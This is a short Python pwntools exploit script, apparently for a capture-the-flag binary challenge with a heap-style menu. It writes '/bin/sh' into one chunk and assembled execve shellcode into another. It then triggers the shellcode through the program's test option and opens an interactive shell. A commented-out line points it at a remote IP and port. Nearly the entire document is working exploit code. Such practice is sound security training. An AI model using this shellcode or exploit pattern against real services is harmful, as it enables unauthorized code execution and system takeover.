from pwn import *
context.log_level = 'debug'
e = ELF("./main")
context.binary = e
p = process(['./main'])
#p = remote("47.104.71.220",10273)

def add(idx):
    p.sendlineafter('Choice : ','1')
    p.sendlineafter('Index? : ',str(idx))

def edit(idx,content):
    p.sendlineafter('Choice : ','2')
    p.sendlineafter('Index? : ',str(idx))
    p.sendafter('iNput:', content)

def delete(idx):
    p.sendlineafter('Choice : ','3')
    p.sendlineafter('Index? : ',str(idx))

def test(idx):
    p.sendlineafter('Choice : ','4')
    p.sendlineafter('Index? : ',str(idx))

#p.sendafter('Name:\n','PWN')
#p.sendlineafter('Choice:',str(0xE<<32))
#p.sendlineafter('Choice:',str(0))

add(0)
add(1)
edit(1,'/bin/sh\x00')
payload = asm('add dl,0x20;xor esi,esi;xchg rdi,rdx;push rsi;pop rax;mov al,59;syscall;')
edit(0,payload)

gdb.attach(p,"b *$rebase(0xE9F)")
raw_input()

sleep(0.2)
test(0)


p.interactive()

if __name__ == '__main__':
    pass